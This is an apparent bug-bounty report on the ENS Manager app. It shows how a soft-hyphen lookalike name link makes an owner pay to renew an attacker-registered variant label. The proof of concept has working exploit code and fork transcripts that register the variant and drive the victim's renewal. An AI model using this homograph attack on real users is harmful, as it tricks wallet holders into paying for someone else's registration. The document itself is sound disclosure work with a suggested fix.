# 91080 w a critical a visually identical link makes a name holder pay to extend somebody else s registration manager decides ownership expiry and the third party renewal warning on the ens norma&#x20;

**Submitted on Aug 29th 2026 at 14:03:13 UTC by @zhouchungong for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91080
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Manager decides **whose name this is, when it expires, and whether to warn you that it is not yours** by ENS-normalizing the name in the URL. It decides **which label to renew, and what to charge** from the same URL string with only `trim().toLowerCase()` applied. `crypto­.eth` — `crypto.eth` with a soft hyphen (U+00AD) before the dot — normalizes to `crypto.eth` but lowercases to itself. U+00AD is a conditional hyphen, drawn only where a line break falls on it; rendered inline in Chromium at 16px system-ui the two strings measure the same width to the pixel (78.265625 px each — step A of the PoC).

So the holder of `crypto.eth`, opening a link to `/crypto­.eth`, is shown their own name, their own expiry date, and a Renew button with no third-party warning, and the payment they then approve extends a label registered by somebody else. Their own name is not extended.

On a fork of live Sepolia this costs the victim 8.005501 USDC and adds exactly one year to the other party's registration, with zero seconds added to their own. The PoC field has the run.

## Vulnerability Details

1. **Nothing normalizes the route parameter on its way to the transaction.** `routes/$name/route.tsx:5-13` validates only length and the presence of a dot, and no step between that route and the `renew` call applies ENS normalization. Other consumers of the same parameter do normalize it — that split is the defect, and it is item 2.
2. **Ownership, expiry and the "not your name" warning are all computed on the normalized form.**
   * `features/profile/service/profileOwner.ts:25` calls `normalizeEthName(params.name)` and queries ownership with the normalized name; `ProfileView.tsx:119` turns that owner into `isOwner` via `useIsOwner` (`:47-58`), and it reaches the renew control unchanged except while the query is pending (`:152`, `:200`, `:230`, `ProfileActions.tsx:47,101`).
   * `features/profile/service/profileExpiry.ts:77` calls `normalizeEth2LdName(name)` before reading the expiry.
   * `ProfileRenewAction.tsx:66` renders the third-party renewal dialog only when `shouldShowThirdPartyRenewalWarning(isOwner)`, and that function is `isOwner === false` (`features/renew/utils/thirdPartyRenewalWarning.ts:3`). Because ownership was decided on the normalized name, `isOwner` is `true`, so the dialog whose purpose is to say *you are renewing a name you do not own* does not open, and `ProfileRenewAction.tsx:83-84` links straight to the renewal route for the name's protocol — `/renew/$name` for a v2 name (`renewalProtocol.ts:10`) — passing the **raw** `name` as the parameter. The grace-period banner is driven by the same `isOwner` (`ProfileStatusBanners.tsx:43`), so it fails the same way where it renders at all.
   * The page does not merely omit a warning, it affirms the opposite: `ProfileDetails.tsx:112-122` renders an `Owner` row for the owner resolved from the normalized name — the visitor themselves — and its value is `ownerReverseName || truncateAddress(owner)` (`:121`), so where the visitor has a primary name set the row shows that name rather than an address.
3. **The renewal label is the raw string, lowercased.** `parseRenewableName` (`features/renew/utils/renewableName.ts:25-36`) delegates to `parseName`, whose only transformation is `const normalized = name.trim().toLowerCase()` (`features/register-v2/utils/name-parser.ts:46`). Its character checks are a blocklist of ASCII punctuation (`:11`, applied at `:73`), a whitespace check (`:49`) and a consecutive-dot check (`:54`); soft hyphen, fullwidth letters and U+FE0F trip none of them — the PoC runs each of them through the real `parseName`.
4. **One loader returns both names at once.** `routes/renew/$name.tsx:61-62` returns `label: parsedName.value.label` (raw) and `currentExpiry: expiryData.expiry` (normalized) in the same object, and hands them to the same page.
5. **The price is computed for the raw label too, so nothing on the page looks wrong.** `features/renew/data/queries/renewPricing.query.ts:26-49` calls ensjs `getRenewPrice` with that label. Once the variant is registered, it prices identically to the real name: against the live Sepolia registrar both `crypto` and `crypto­` quote 8005501 (8.005501 USDC per year). Before it is registered that call reverts, so no quote can be produced for an unheld variant — which is why the attacker has to register the label first; see the preconditions below.
6. **The transaction carries the raw label, and the application builds it that way when driven.** The renewal machine hands `submission.label` to `submitRenewActor` (`features/renew/state/renewalUi.machine.ts:344-352`, the label at `:349`), which builds the call: `encodeRenewData` at `packages/transaction-manager/src/machines/registration/registration.actors.ts:1020-1030` encodes `renew(label, duration, paymentToken, referrer)`, the first argument being `cleanLabel = label.replace('.eth','')` at `:1025`, and `:1082` addresses it to `renewerAddress` — for a v2 name the canonical `ETHRegistrar` (`features/renew/utils/renewalProtocol.ts:5-8`, defaulted identically at `:1053-1054`). The PoC drives that actor rather than reading it: given the loader's label it produces calldata whose decoded first argument is `crypto­` and whose target is `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, with the control spelling producing `crypto` through the same path. The registrar accepts non-normalized labels: it quoted a registration price for `crypto­` and registered it without complaint.
7. **The bulk path one feature over guards against exactly this, and names the hazard.** `features/dashboard/components/NamesTable.tsx:84-86` prefers `domain.normalizedName` for the on-chain label (falling back to the display name only when the indexer supplies no normalized form), commenting: `Use the canonical normalized name for the on-chain label — the display name may be unnormalized (e.g. mixed case) and would hash to the wrong label.` The single-name path does not.
8. **The project already requires the missing step, in writing, and the sibling app performs it.** `.greptile/config.json:189-193` carries a repo-wide review rule `normalize-ens-names`, scoped to `apps/**/*.ts` and `apps/**/*.tsx`: `User-supplied ENS names must pass through \`normalize\` from \`viem/ens\` before being used in contract calls or queries.`The renewal label does not. And the other paid asset does it on the same route parameter:`apps/portal/src/routes/$name/index.tsx:441-442,457-459`runs the route parameter through`isValidEnsName `(`utils/token/isNormalized.ts:39`), which requires every label to satisfy` ens\_normalize(label) === label `(`:16-20`, with an explicit carve-out for encoded labelhashes) and otherwise renders` Invalid name`.` apps/manager/src/routes/$name/route.tsx:5-13\` checks only length and a dot.
9. **The dialog that would have caught this is a consent gate, and it is gated on the same boolean.** `shouldShowThirdPartyRenewalWarning` is `isOwner === false` (`thirdPartyRenewalWarning.ts:3`) and has its own unit test named for both branches (`thirdPartyRenewalWarning.test.ts:5,9`); its copy tells the user that renewing `will add time to the current owner's registration. You won't gain ownership of the name, but you will make someone's day.` behind an `I Understand` button (`ThirdPartyRenewalDialog.tsx:66-68`). On the profile page a non-owner reaches the renewal route only through that button — the link lives inside the dialog (`ProfileRenewAction.tsx:66-77`, `ThirdPartyRenewalDialog.tsx:82-88`), and the grace-period banner, which decides from the same `isOwner`, gives a non-owned profile a favourites button instead (`GracePeriodBanner.tsx:123-135`). Both controls therefore treat this visitor as the owner. The link the dialog carries has the same unnormalized parameter as the owner's, and the renewal route adds no ownership check of its own — its loader gates on protocol, grace period and expiry (`routes/renew/$name.tsx`).

## Impact Details

**Malicious interactions with an already-connected wallet — modifying transaction arguments or parameters.**

The final Critical entry in the impact list reads `Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters · Substituting contract addresses · Submitting malicious transactions · Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) · Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address`. The argument modified here is the `label` in `renew(label, duration, paymentToken, referrer)`: the application represents the transaction as renewing the name it has just told the user they own, and sends a different label, chosen by whoever registered the variant.

**Where the defect is, and where it is not.** The ENS smart contracts are out of scope and nothing here asks for one to change. The registrar behaves correctly: it is addressed by label, `crypto` and the soft-hyphen variant are two different labels, and it registers and renews each exactly as instructed. Normalization is an application-layer obligation, which is why this repository states it as one — `.greptile/config.json:189-193` requires user-supplied ENS names to pass through `normalize` before being used in contract calls or queries, and the other paid asset enforces it on this same route parameter. The defect is entirely inside `apps/manager`: it derives two different names from one URL, and uses one of them to tell the user what they own while building the call from the other.

**Relationship to the known-issues list.** The rule is `Reports that describe the same root cause as an entry below will be treated as duplicates, even if the report describes a different exploitation path or entry point.` #51 `EXP-INPUT-005` records that ENS name validators accept inputs that normalization later transforms, and bounds its own consequence to `homograph-style display confusion in the UI rather than incorrect resolution`. What I claim is the exit the same page names: `new consequences of a listed root cause that materially change its severity`.

This does not stop at display. The unnormalized string becomes the `label` argument of a `renew` call to the canonical registrar — the PoC drives the application's own actor to build that calldata — so an ERC-20 payment is approved and spent, a registration the payer does not own is extended, and the dialog that exists to disclose exactly that evaluates `isOwner` on the other string and stays shut. There is no refund and no undo. The list already draws this same line one entry over: #32 `QA-03` records a price mismatch as `(display-level only)` and adds `A mismatch between the displayed total and the amount actually charged on-chain would be a new finding.` This is that distinction with the subject substituted instead of the amount.

**Preconditions.** None of them privileged. The attacker registers a variant label that ENS-normalizes to the victim's name and pays for it themselves — 8005501 for a year at the five-or-more-character rate; without that registration the pricing call reverts and no renewal can be quoted, which is why the label has to exist first. The victim then opens a link to that URL with a connected wallet, clicks Renew, and signs the two transactions the page asks for (the USDC `approve` and the `renew`). Nothing about the victim's account, roles or permissions is required, and every step the victim takes is a step the application asks for on its own pages.

What the attacker gains is not the victim's money — the USDC goes to the registrar, not to them — it is a year of registration on their own label, bought by somebody else, and bought again each time the link brings a holder back to the Renew button. What the victim loses is the payment and the renewal they came to make.

**Where the substitution is invisible.** For a name of five characters or more the variant prices identically to the victim's own renewal — 8005501 either way — because the registrar's base rate is a length class and it counts code points (`apps/manager/src/routes/$name/index.tsx:38`). Below five the extra code point moves the variant into a cheaper class and the quoted price visibly drops, so the attack is bounded to names of five characters or more. Step B prints the three base rates that bound comes from.

**What is on screen at each step.** On the profile page the heading is the name from the URL (`ProfileDetails.tsx:24`, `truncate`), the `Owner` row is the owner resolved from the normalized name and renders as `ownerReverseName || truncateAddress(owner)` (`:112-122`), so a visitor who has a primary name set sees their own name in it, and the expiry is their own. The records and the avatar are fetched with the unnormalized name instead (`profileRecords.ts:82,122-137` and `profileAvatar.ts:12-18`, both via `ProfileView.tsx:94,139`), so those belong to the variant: an attacker who wants the page to look untouched copies the victim's public records onto the variant, and one who does not leaves a profile whose records are empty.

On the renewal page the heading is the raw label again. `PricingStep.tsx:13,24,27` takes `label` from the renewal context and renders `PricingDomainHeader`, which displays `${label}.eth` (`PricingDomainHeader.tsx:9,29`); `RenewalDetails.tsx:50` puts the same string on the confirmation card. That heading's font size is chosen by UTF-8 byte length (`PricingDomainHeader.tsx:10`, `getByteLength`), and both spellings sit in the same first tier — 10 and 12 bytes against a 30-byte bound — so the size does not shift either. One caveat I can state precisely: the heading is `wrap-break-word` (`:24`), not `nowrap`, and the width measurement in the PoC was taken under `nowrap`; a heading broken across lines exactly at that codepoint would draw the hyphen.

Rather than nominate a single point of detection, here are the surfaces I have found where the two spellings can differ, including the one I did not measure; I have not enumerated the application exhaustively, so read this as what I looked at rather than as a closed list. The records and the avatar just described. The renewal heading's line-break case above. And the URL itself, where the character travels as `%C2%AD` and how a given chat client, mail client or address bar renders that was not tested here — the width measurement in the PoC covers text inside a page, not a link. I say so because this report opens by calling the link visually identical, and that claim is measured for the page and unmeasured for the address bar.

**What this does to the victim.** The victim does not lose their name in this transaction and the attacker gains no authority over it; I am not claiming otherwise. What happens is that the renewal silently does not occur and the application reports that it did. `RenewalDetails.tsx:23-32,103-109` computes the `Expires` date it displays as `currentExpiry + duration`, and `currentExpiry` is the loader's value — the expiry of the victim's own name, read from the normalized form. The confirmation screen therefore states that the name they own now expires a year later than it does. They have paid, they have been shown a correct-looking receipt for the thing they came to do, and they have been given no reason to look again. The name they meant to renew continues toward its original expiry date, and the dialog that exists to tell them they are extending someone else's registration never opened. `Back to profile` (`:114-120`) returns them to the same URL, where the page will make the same offer again.

Recovery exists, but it requires the victim to distrust a screen that has just confirmed success. Their true expiry is still correct wherever a name is not taken from a URL — the dashboard builds its rows from indexed names rather than from the address bar — so a victim who goes and looks can still renew correctly. Nothing in this flow prompts them to.

**Suggested fix.** Derive the name once where the parameter enters (`routes/$name/route.tsx`, `routes/renew/$name.tsx`) and carry that one value to every consumer, rather than letting each consumer derive its own. `parseName`'s `toLowerCase()` should not stand in for normalization anywhere a label reaches a contract; `NamesTable.tsx:84-86` shows the intended pattern and says why.

## References

* `apps/manager/src/routes/renew/$name.tsx:61-62`
* `apps/manager/src/routes/$name/route.tsx:5-13`
* `apps/manager/src/routes/$name/index.tsx:38`
* `apps/manager/src/features/register-v2/utils/name-parser.ts:11,46,49,54,73,87-93`
* `apps/manager/src/features/renew/utils/renewableName.ts:25-36`
* `apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts:3`
* `apps/manager/src/features/profile/components/view/ProfileRenewAction.tsx:66,83-84`
* `apps/manager/src/features/profile/service/profileOwner.ts:25`
* `apps/manager/src/features/profile/service/profileExpiry.ts:77`
* `apps/manager/src/features/profile/components/view/ProfileView.tsx:47-58,94,119,139,152,200,230`
* `apps/manager/src/features/profile/components/view/ProfileActions.tsx:47,101`
* `apps/manager/src/features/profile/service/profileRecords.ts:82,122-137`
* `apps/manager/src/features/profile/service/profileAvatar.ts:12-18`
* `apps/manager/src/features/grace/components/GracePeriodBanner.tsx:123-135`
* `apps/manager/src/features/renew/workflow/pricing/PricingStep.tsx:13,24,27`
* `apps/manager/src/features/register-v2/workflow/pricing/components/PricingDomainHeader.tsx:9,10,24,29`
* `apps/manager/src/features/renew/data/queries/renewPricing.query.ts:26-49`
* `apps/manager/src/features/renew/utils/renewalProtocol.ts:5-8,10`
* `apps/manager/src/features/dashboard/components/NamesTable.tsx:84-86`
* `packages/transaction-manager/src/machines/registration/registration.actors.ts:1020-1030,1053-1054,1082`
* `apps/manager/src/features/profile/components/view/ProfileDetails.tsx:24,112-122`
* `apps/manager/src/features/profile/components/view/ProfileStatusBanners.tsx:43`
* `apps/manager/src/features/renew/workflow/renewing/components/RenewalDetails.tsx:23-32,50,103-109,114-120`
* `apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.test.ts:5,9`
* `apps/manager/src/features/renew/components/ThirdPartyRenewalDialog.tsx:66-68,82-88`
* `apps/manager/src/features/renew/state/renewalUi.machine.ts:344-352,349`
* `apps/portal/src/routes/$name/index.tsx:441-442,457-459`
* `apps/portal/src/utils/token/isNormalized.ts:16-20,39`
* `.greptile/config.json:189-193`

## Proof of Concept

### Reproduction steps

{% stepper %} {% step %}

## Start a fork of Sepolia

Start a fork of Sepolia at the block these readings were taken on:

```bash
anvil --fork-url https://sepolia.gateway.tenderly.co --port 8553 --fork-block-number 11588799
```

The RPC must serve archive state; several public Sepolia endpoints drop it within minutes. Every write below happens on this fork — nothing is sent to a public network. The registration in step 3 is not idempotent: once the variant label exists, the register call reverts, so restart anvil for a second run.

## Confirm the two spellings disagree

Run step A below. `crypto­.eth` (with U+00AD before the dot) ENS-normalizes to `crypto.eth` and lowercases to itself.

## Register the variant label

As the attacker, register the variant label against the ETHRegistrar:

`makeCommitment` → `commit` → advance past the commitment age → `approve` USDC → `register`

Use step C, first block.

## Open the Manager using the variant URL

Open the Manager at `/crypto­.eth` with the wallet that owns `crypto.eth`.

The page shows that name, an `Owner` row resolved to you (rendered as your primary name where you have one, otherwise your truncated address), and its expiry; the Renew button carries no third-party warning. Step B runs the same modules the page runs and prints each of those values.

## Renew the variant

Click Renew, keep the default one year, approve the USDC, and confirm.

Step C's second block is that transaction: `approve` then `renew(label, duration, paymentToken, referrer)`; step D shows the application's own actor building that call's arguments from the URL label.

## Read both expiries

The variant gained a year; `crypto.eth` gained nothing; the wallet is 8.005501 USDC lighter.

**Where the code is.** All four scripts are inlined in full in section E; nothing here depends on a file you cannot see. Their outputs are the blocks quoted verbatim in steps B, C and D. How to run them, and what each writes:

| script               | run from                                                                              | command                                           | writes            | quoted here as          |
| -------------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------- | ----------------- | ----------------------- |
| `poc3.mjs`           | `apps/manager` (so `viem` and `@ensdomains/ensjs` resolve from the workspace)         | `node poc3.mjs > out-softhyphen.json`             | stdout only       | step C's Observed block |
| `r29c.poc.test.ts`   | place in `apps/manager/src/features/renew/`, run `npx vitest run` from `apps/manager` | writes `r29c-out.json` into the working directory | `r29c-out.json`   | step B's first block    |
| `r30ui.poc.test.tsx` | place in `apps/manager/src/features/profile/components/view/`                         | same                                              | `r30ui-out.json`  | step B's render block   |
| `r30e2e.poc.test.ts` | place in `apps/manager/src/features/renew/`, run `npx vitest run` from `apps/manager` | same                                              | `r30e2e-out.json` | step D's block          |

Run the money leg before the reads: step B reads a fork on which the variant is already registered.

Steps 4–5 are executed as the module and contract calls those pages make — step B for the reads behind step 4, step C for the writes behind step 5 — not as browser clicks. No page is rendered end to end; step B renders one component, and what the other screens display is read from source in the closing section, after step D.

***

### A. One string, two answers

`viem/ens` `normalize` is what `normalizeEthName`/`normalizeEth2LdName` use. `trim().toLowerCase()` is all `parseName` does.

```js
import { normalize } from 'viem/ens'
for (const c of ['crypto­.eth', 'ｃrypto.eth', 'cryptｏ.eth', 'CRYPTO.eth']) {
  console.log(JSON.stringify(c), '| lowercase:', JSON.stringify(c.trim().toLowerCase()),
              '| ens_normalize:', JSON.stringify(normalize(c)))
}
```

```
"crypto­.eth" | lowercase: "crypto­.eth" | ens_normalize: "crypto.eth"   <- soft hyphen U+00AD, drawn only at a line break
"ｃrypto.eth"  | lowercase: "ｃrypto.eth"  | ens_normalize: "crypto.eth"   <- fullwidth c
"cryptｏ.eth"  | lowercase: "cryptｏ.eth"  | ens_normalize: "crypto.eth"   <- fullwidth o
"CRYPTO.eth"       | lowercase: "crypto.eth"       | ens_normalize: "crypto.eth"   <- control: these agree
```

Whether the soft-hyphen variant is distinguishable on screen is a rendering question, so it was measured rather than asserted. Served over http and measured in Chromium with `white-space: nowrap`, `font: 16px system-ui`, `getBoundingClientRect().width`:

```
"crypto.eth"        78.265625 px
"crypto­.eth"  78.265625 px   delta 0
"ｃrypto.eth"       86.234375 px   delta +7.97   (fullwidth c — visibly wider)
"cryptｏ.eth"       84.21875  px   delta +5.95   (fullwidth o — visibly wider)
```

The soft-hyphen row is reproducible in a page of its own — serve this and read the console; the two fullwidth rows are the same measurement with the other spellings substituted:

```html
<span id="a" style="white-space:nowrap;font:16px system-ui">crypto.eth</span>
<span id="b" style="white-space:nowrap;font:16px system-ui">crypto­.eth</span>
<script>for (const id of ['a','b'])
  console.log(id, document.getElementById(id).getBoundingClientRect().width)</script>
```

The deltas above are those widths subtracted, not separate readings. `system-ui` resolves per machine, so the absolute numbers are this machine's. They are also not the profile heading's own type: that is `text-[32px] font-semi-mono` (`ProfileDetails.tsx:24`), larger and a different family. A character that is not drawn has no width in either, which is what carries; the pixel figures are this font's, not that one's.

Of the spellings measured here, the U+00AD variant is the one that is both spelling-distinct and dimensionally identical. The fullwidth pair survives `toLowerCase()` too but is visibly wider, so they serve as controls, and `CRYPTO.eth` is the control in the other direction — for plain case the two paths agree, which is why this is not a mixed-case bug. A fifth spelling that step B exercises, `crypto️.eth`, also survives `parseName` and also normalizes away; U+FE0F is a variation selector and would be expected to add no width, but it was not measured and I claim nothing about how it renders.

***

### B. The Manager's own modules, on the renewal path

Two test files carry this step, both inlined in section E: `r29c.poc.test.ts` for the reads below (place in `apps/manager/src/features/renew/`) and `r30ui.poc.test.tsx` for the render (place in `apps/manager/src/features/profile/components/view/`, next to the component it imports). They import the shipped services and predicates; the only replacements are `vi.mock('@/lib/wagmi')` and `vi.mock('@/lib/wagmi/helpers')` pointed at the fork, `vi.mock('@ens-apps/indexer/urql')` returning no domain, and — in the render test only — `@tanstack/react-router`'s `Link`/`createLink` captured so the emitted route can be read.

```ts
// r29c.poc.test.ts (name kept from the round it was written in), run with `npx vitest run`
const parsed = parseRenewableName(urlName)                        // renewableName.ts
const expiry = await getExpiry(urlName)                           // profileExpiry.ts (normalizes)
const owner  = await getOwner({ name: urlName })                  // profileOwner.ts  (normalizes)
const date   = profileExpiryDateFromSeconds(expiry.value.expiry)
out[urlName] = {
  parsedLabel:               parsed.value.label,                  // what gets renewed
  ownerFromNormalized:       owner.value.owner,
  expiryFromNormalized:      expiry.value.expiry,
  loader_protocol:           expiry.value.protocol,
  loader_pastGrace:          isPastGracePeriod(date, 'v2'),
  loader_canRenewV2Name:     canRenewV2Name(urlName, date),
  renewPriceForParsedLabel:  await getRenewPrice(parsed.value.label, YEAR, 'USDC', 'v2'),
}
```

```
same fork as step C, after the attacker's registration (five URL spellings):

  ownerFromNormalized                      0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57  (the victim)
  expiryFromNormalized                     1818102852               (the victim's own name)
  loader_protocol / pastGrace / canRenew   v2 / false / true
  isConnectedProfileOwner(owner, victim's wallet)   true            (the app's own helper)

  parsedLabel        "crypto.eth"       -> "crypto"        (control: both paths agree)
                     "crypto­.eth"  -> "crypto­"
                     "ｃrypto.eth"      -> "ｃrypto"
                     "cryptｏ.eth"      -> "cryptｏ"
                     "crypto️.eth"      -> "crypto️"       (U+FE0F also survives parseName)

  renewPriceForParsedLabel
                     "crypto"        {"amount":"8005501"}
                     "crypto­"  {"amount":"8005501"}   <- identical, from the app's own query
                     the three unregistered variants: GetRenewPriceError

  getBaseRates, per second in the registrar's 1e6-scaled units, by label length 1..5+
                     0, 0, 20294267, 5073567, 253679
  x 31,557,600 s / 1e6
                     -, -, 640438360, 160109597, 8005500
                     (the 5+ figure rounds down from 8,005,500.41; the registrar's
                      own quote for a year, printed above, is 8005501)
```

Every gate passes for all five spellings, and the only value that differs is the one that reaches the contract. `isConnectedProfileOwner` is the same helper `useIsOwner` calls (`ProfileView.tsx:52-57`), so the step that turns "normalized owner" into "you own this" is executed here, not assumed. The three unregistered variants failing the price call is the control that shows why the attacker must register the label first.

**The consent gate, on the rendered component.** `shouldShowThirdPartyRenewalWarning` is `isOwner === false`, so testing that function proves nothing on its own; what matters is what the component renders. The real `ProfileRenewAction` is rendered for the variant name with the router's `Link`/`createLink` captured. `isOwner` is supplied to that render as a prop rather than recomputed inside it, so the two rows below are the component's two branches, not a measurement of which branch this URL takes. That part is source, and it is short: the normalized lookup in step B produces the owner, `useIsOwner` turns it into the boolean (`ProfileView.tsx:47-58,119`), and `:152` derives `resolvedIsOwner` from it (`isOwnerPending ? undefined : isOwner`), which reaches the desktop control through `:230` and the mobile one through `:200` (`ProfileActions.tsx:101`, `:47`). Step B measures the first half of that chain; the second half is read, not driven.

```
isOwner = true   (the value that chain delivers for this URL)
  renders a dialog trigger?  false
  link emitted:              to "/renew/$name"  params { name: "crypto­.eth" }   <- raw

isOwner = false  (a genuine third party)
  renders a dialog trigger?  true
  link emitted:              none
```

The discriminator is `aria-haspopup="dialog"` in the rendered markup: present in one branch, absent in the other. One row above and one archived field carry no information, and I mark both. A closed Radix dialog is unmounted, so on the `isOwner = false` branch the dialog's own button is not in the tree and nothing could be captured from it — `link emitted: none` records that absence, not a finding about what that button would carry. That same unmounting, together with a regex searching for wording this dialog does not use (`r30ui.poc.test.tsx:43`; the copy says `current owner's`), is why the archived run's `hasThirdPartyDialogCopy` field reads false on both sides. Neither is evidence and nothing here rests on either. What the dialog contains when it does open is source: `ThirdPartyRenewalDialog.tsx:66-68` (the `current owner's registration` copy) and `:82-88` (the `I Understand` button, which on the profile page is the only link a non-owner gets).

The consent step is present for a third party and absent for the visitor the normalized lookup calls the owner — while the link that is emitted carries the unnormalized name.

***

### C. The money leg

The victim's name here is six characters, which puts it and the variant in the same five-or-more length class, so both price at 8005501. That is a precondition of the substitution staying invisible, not a coincidence: on a three- or four-character victim name the extra codepoint moves the variant into the cheaper class and the renewal page quotes a visibly different figure — the rate table in step B is what bounds this, and the description states the bound.

The attacker registers the variant directly against the registrar (no application involved — this is just an ordinary registration of an unclaimed label). Then the victim, impersonated on the fork, sends the same call the Manager encodes: `renew(label, duration, paymentToken, referrer)` with the label from step B and `referrer = zeroHash`, which is the constant the app uses (`REFERER_ADDRESS`, `contracts/ens-sepolia.ts:72`). This leg builds that call directly rather than through the application; step D is where the shipped `submitRenewActor` is driven and the calldata it produces is decoded.

```js
const VICTIM = '0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57'   // owner of crypto.eth
const VAR = 'crypto­', YEAR = 31557600n   // VAR renders as 'crypto'

// fork prep for both actors: impersonate, fund, and clear any EIP-7702 delegation
for (const a of [VICTIM, ATTACKER]) {
  await rpc('anvil_impersonateAccount', [a])
  await rpc('anvil_setBalance', [a, '0x56bc75e2d63100000'])
  await rpc('anvil_setCode', [a, '0x'])
}

// attacker: commit -> wait -> approve USDC -> register the variant label
const c = await makeCommitment(VAR, ATTACKER, SECRET, zeroAddress, zeroAddress, YEAR, zeroHash)
await send(ATTACKER, R, encode('commit', [c]))
await rpc('evm_increaseTime', [300]); await rpc('evm_mine', [])
await send(ATTACKER, USDC, encode('approve', [R, 1_000_000_000n]))
await send(ATTACKER, R, encode('register', [VAR, ATTACKER, SECRET, zeroAddress, zeroAddress, YEAR, USDC, zeroHash]))

// victim: the renewal the Manager would submit for /crypto­.eth
const rp = await getRenewPrice(pub, { renewerAddress: R, label: VAR, duration: YEAR, paymentToken: USDC })
await send(VICTIM, USDC, encode('approve', [R, rp.amount * 2n]))
await send(VICTIM, R, encode('renew', [VAR, YEAR, USDC, zeroHash]))
```

Observed. These are the values `poc3.mjs` (section E) printed to `out-softhyphen.json`; the fork is the same one step B reads (port 8553, block 11588799), with step C's registration already applied. Absolute expiry timestamps depend on the fork block, so only the deltas carry across reruns:

```
strings          urlName "crypto­.eth"   codepoints 63 72 79 70 74 6f ad 2e 65 74 68
                 ens_normalize "crypto.eth"   lowercase "crypto­.eth"

before           expiry crypto                1818102852
                 expiry crypto­          0                (unregistered)
                 owner of normalized          0x0a7b367E...      (the victim)
                 victim USDC balance          175435538

attacker         registerPrice                {"base":"8005501","premium":"0"}   (the 5+ character class rate)
                 commit / approve / register  success / success / success
after register   expiry crypto­          1819527034

victim           renewPrice for that label    8005501
                 approve / renew              success / success

after            expiry crypto                1818102852   -> +0 seconds
                 expiry crypto­          1851084634   -> +31,557,600 seconds (one year)
                 USDC spent by the victim     8005501
```

The victim paid, the attacker's registration gained a year, and the victim's own name gained nothing. Both expiries are read by the same function from the same registry in the same run, so the pair is a fair comparison rather than two differently-taken measurements. I will not overstate what it shows: once the call carries the variant label, the victim's own name standing still follows from how the registrar accounts, and what this leg establishes is that the registrar credits by label and that the money actually leaves. What it does not establish on its own is that the application emits the variant label — that is step B for the value and step D, where the shipped actor is driven and the calldata it builds is decoded; the control spelling in both places yields `crypto`, which is what the same transaction would carry instead.

***

### D. The application's own actor, driven

The hop from the loader's `label` to the calldata is three lines:

* `routes/renew/$name.tsx:61-62` returns `label` (raw, from `parseName`) and `currentExpiry` (from the normalized name) together.
* `renewalUi.machine.ts:344-352` passes `submission.label` (`:349`) into `submitRenewActor`.
* `registration.actors.ts:1039` builds the call; `:1025` is where the label becomes the first argument and `:1082` addresses it to the canonical `ETHRegistrar`.

The last of those is executed here rather than read. `r30e2e.poc.test.ts` (section E) calls the shipped `submitRenewActor` with the loader's label and replaces exactly one thing — the transaction-manager singleton, so the request it builds is captured instead of broadcast. `encodeRenewData`, `createTransactionRequest` and the payment-token check are the shipped code, and that check reads the registrar on the fork.

```
label handed to submitRenewActor   "crypto­"                  "crypto"  (control)
actor result                       ok                                ok
request.from                       0x0a7b367E... (the victim)        same
request.to                         0xa88553F454b77203B0D036A05c894d555EAAa2Cc
                                   == ENS_SEPOLIA_CONTRACTS.ETHRegistrar
calldata selector                  0x89d779c3 == renew(string,uint64,address,bytes32)
first argument, decoded            "crypto­"                  "crypto"
duration, decoded                  31557600                          31557600
description the app attaches       "Renew crypto­.eth"        "Renew crypto.eth"
codepoints of the decoded label    63 72 79 70 74 6f ad              63 72 79 70 74 6f
```

Nothing was broadcast: the stub returns a placeholder id in place of `startTransaction`. What this closes is the step that used to be readable only — the application's own code turns the raw URL label into `renew(<raw label>, ...)` addressed to the canonical registrar, and the control spelling produces `crypto` through the same path.

**Scope of this PoC.** Steps A–D are executed. One hop is still read rather than driven: the loader's `label` reaching `submitRenewActor`, which `renewalUi.machine.ts:349` passes on verbatim as `submission.label`. `grep -rn normalize apps/manager/src/features/renew/` returns nothing, and no step between the route and the call recomputes the label.

The renewal page was not rendered, but what it puts on screen is not left to inference: `PricingStep.tsx:13,24,27` takes `label` straight from the renewal context and renders `PricingDomainHeader`, which builds and displays `${label}.eth` (`PricingDomainHeader.tsx:9,29`), and `RenewalDetails.tsx:50` shows the same string on the confirmation card. So the string on the payment screen is the raw label, while the `Expires` date beside it is computed from the normalized name's expiry (`RenewalDetails.tsx:23-32,103-109`) — the two halves of the split, side by side on the screen where the money is committed.

The width comparison in step A was taken with `white-space: nowrap`, which is how the profile heading renders it (`ProfileDetails.tsx:24`, `truncate`). The renewal heading is not: it is `wrap-break-word` (`PricingDomainHeader.tsx:24`), so on that page a line break falling exactly on the soft hyphen would draw it. That is one of the surfaces where the two spellings can differ, and it depends on the viewport and the name's length; the description enumerates the rest, including the URL itself, which was not measured anywhere in this PoC.

Two further things are deliberately not claimed as tested. The victim's signature is supplied by `anvil_impersonateAccount`, so a wallet's confirmation screen was not observed — what a wallet shows for this call is the target contract and the calldata, so it can display the substituted label but cannot tell the user which registration that label belongs to. And the indexer client is stubbed to return no domain, which forces every read in step B onto the RPC path; the indexer is out of scope, but that stub is a precondition of those readings, not merely a skipped module.

***

### E. The scripts, in full

`poc3.mjs` — the money leg (step C):

```js
import { createPublicClient, http, parseAbi, zeroAddress, zeroHash, encodeFunctionData } from 'viem'
import { sepolia } from 'viem/chains'
import { normalize } from 'viem/ens'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getExpiry, getRenewPrice, getRegisterPrice, getOwner } from '@ensdomains/ensjs/public/v2'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http('http://127.0.0.1:8553',{retryCount:5,timeout:180000}) })
